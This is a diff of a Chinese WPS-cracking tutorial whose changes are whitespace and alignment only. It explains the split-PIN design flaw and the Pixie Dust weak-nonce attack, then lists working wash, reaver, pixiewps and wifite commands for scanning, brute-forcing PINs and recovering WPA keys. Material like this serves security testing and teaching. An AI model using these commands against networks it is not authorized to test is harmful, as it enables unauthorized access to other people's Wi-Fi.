@@ -36,11 +36,11 @@ PIN码格式：XXXXXXXX (8位数字)
 看似有 100,000,000 种可能，但实际上...
 
 ┌─────────────────────────────────────────┐
-│ 前4位 (0000-9999)  │ 后3位 (000-999)  │ 校验位(1位) │
-│    10,000种        │   1,000种        │    自动计算    │
+│ 前4位 (0000-9999) │ 后3位 (000-999) │ 校验位(1位) │
+│ 10,000种 │ 1,000种 │ 自动计算 │
 └─────────────────────────────────────────┘
-     分开验证！             分开验证！
-   M1-M4验证前4位        M5-M8验证后4位
+ 分开验证！ 分开验证！
+ M1-M4验证前4位 M5-M8验证后4位
 ```
 
 对比：
@@ -52,22 +52,22 @@ PIN码格式：XXXXXXXX (8位数字)
 
 ```mermaid
 sequenceDiagram
-    participant AP as 接入点
-    participant C as 客户端
+ participant AP as 接入点
+ participant C as 客户端
 
-    AP->>C: M1: N1, PK_A, 设备描述
-    C->>AP: M2: N2, PK_S, 设备描述(AuthKey加密)
-    AP->>C: M3: N2 (AuthKey加密)
-    C->>AP: M4: N1 (AuthKey加密)
-    Note over AP,C: PIN前4位验证完成
+ AP->>C: M1: N1, PK_A, 设备描述
+ C->>AP: M2: N2, PK_S, 设备描述(AuthKey加密)
+ AP->>C: M3: N2 (AuthKey加密)
+ C->>AP: M4: N1 (AuthKey加密)
+ Note over AP,C: PIN前4位验证完成
 
-    AP->>C: M5: N1' (AuthKey基于PIN后半更新)
-    C->>AP: M6: N2' (AuthKey加密)
-    AP->>C: M7: N2' (AuthKey加密)
-    Note over AP,C: PIN后4位验证完成
+ AP->>C: M5: N1' (AuthKey基于PIN后半更新)
+ C->>AP: M6: N2' (AuthKey加密)
+ AP->>C: M7: N2' (AuthKey加密)
+ Note over AP,C: PIN后4位验证完成
 
-    C->>AP: M8: 确认消息
-    Note over AP,C: PIN码完全正确 → AP返回WPA PSK
+ C->>AP: M8: 确认消息
+ Note over AP,C: PIN码完全正确 → AP返回WPA PSK
 ```
 
 为什么分两步？
@@ -84,17 +84,17 @@ Pixie Dust是较新的WPS攻击方式(2014年公开)。
 
 ```
 脆弱实现中：
-  - N1由弱的PRNG生成 (如线性同余生成器LCG)
-  - N1可被预测或恢复
-  - 如果知道N1和N2，可以推导出DHSharedSecret
-  - 有了DHSharedSecret，可以直接计算AuthKey
-  - 无需暴力破解PIN！几秒到几分钟完成攻击！
+ - N1由弱的PRNG生成 (如线性同余生成器LCG)
+ - N1可被预测或恢复
+ - 如果知道N1和N2，可以推导出DHSharedSecret
+ - 有了DHSharedSecret，可以直接计算AuthKey
+ - 无需暴力破解PIN！几秒到几分钟完成攻击！
 
 受影响芯片组：
-  - Ralink / MediaTek (最常见)
-  - Broadcom BCMxxxx (部分老版本)
-  - Realtek (部分型号)
-  - 某些Qualcomm Atheros设备
+ - Ralink / MediaTek (最常见)
+ - Broadcom BCMxxxx (部分老版本)
+ - Realtek (部分型号)
+ - 某些Qualcomm Atheros设备
 ```
 
 ---
@@ -122,11 +122,11 @@ sudo wash -i wlan0mon
 ### 2.2 高级参数
 
 ```bash
-sudo wash -i wlan0mon -a        # 显示所有AP(包括不支持WPS)
-sudo wash -i wlan0mon -c 6 -a   # 仅扫描信道6
-sudo wash -i wlan0mon -s        # 静默模式
-sudo wash -i wlan0mon -j        # JSON输出格式
-sudo wash -i wlan0mon --ignore-fcs  # 忽略FCS错误
+sudo wash -i wlan0mon -a # 显示所有AP(包括不支持WPS)
+sudo wash -i wlan0mon -c 6 -a # 仅扫描信道6
+sudo wash -i wlan0mon -s # 静默模式
+sudo wash -i wlan0mon -j # JSON输出格式
+sudo wash -i wlan0mon --ignore-fcs # 忽略FCS错误
 ```
 
 新版reaver(fork-t6x)中的wash：
@@ -200,11 +200,11 @@ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
 
 优化参数：
 ```bash
---pin=12345670         # 从指定PIN开始试
---session=FILE         # 保存/恢复session
---no-associate         # 不主动关联
---fail-wait=60         # 失败后等待60秒
---max-attempts=N       # 限制最大尝试次数
+--pin=12345670 # 从指定PIN开始试
+--session=FILE # 保存/恢复session
+--no-associate # 不主动关联
+--fail-wait=60 # 失败后等待60秒
+--max-attempts=N # 限制最大尝试次数
 ```
 
 ### 3.4 恢复已保存的会话
@@ -218,7 +218,7 @@ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s reaver_session_file
 - `/usr/local/etc/reaver/<BSSID>.wpc`
 
 ```bash
-cat /etc/reaver/AA:BB:CC:DD:EE:FF.wpc  # 查看进度
+cat /etc/reaver/AA:BB:CC:DD:EE:FF.wpc # 查看进度
 ```
 
 ### 3.5 故障排除
@@ -320,15 +320,15 @@ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vvv
 
 # Step 2: 手动运行pixiewps
 pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> \
-  -a <AuthKey> -n <E-Nonce>
+ -a <AuthKey> -n <E-Nonce>
 ```
 
 ### 5.2 pixiewps高级选项
 
 ```bash
-pixiewps --pixie-dust           # 强制Pixie Dust模式
-pixiewps --dh-small             # DH Small Keys攻击
-pixiewps -e ... -r ... --force  # 尝试所有可用方式
+pixiewps --pixie-dust # 强制Pixie Dust模式
+pixiewps --dh-small # DH Small Keys攻击
+pixiewps -e ... -r ... --force # 尝试所有可用方式
 ```
 
 ---
@@ -345,19 +345,19 @@ wifite的WPS攻击流程：
 1. 自动扫描WPS设备
 2. 按信号强度排序
 3. 对每个目标：
-   a) 首选尝试Pixie Dust攻击
-   b) Pixie失败后回退标准PIN暴力
-   c) 智能处理WPS锁定
+ a) 首选尝试Pixie Dust攻击
+ b) Pixie失败后回退标准PIN暴力
+ c) 智能处理WPS锁定
 4. 破解成功后提取WPA PSK
 
 ### 6.2 高级选项
 
 ```bash
-sudo wifite --wps --pixie                       # 仅Pixie Dust
-sudo wifite --wps --no-pixie                    # 禁用Pixie Dust
-sudo wifite --wps --all                          # 攻击所有目标
-sudo wifite --wps -b AA:BB:CC:DD:EE:FF -c 6     # 指定目标
-sudo wifite --wps --daemon                       # 守护模式
+sudo wifite --wps --pixie # 仅Pixie Dust
+sudo wifite --wps --no-pixie # 禁用Pixie Dust
+sudo wifite --wps --all # 攻击所有目标
+sudo wifite --wps -b AA:BB:CC:DD:EE:FF -c 6 # 指定目标
+sudo wifite --wps --daemon # 守护模式
 ```
 
 ### 6.3 已知PIN验证
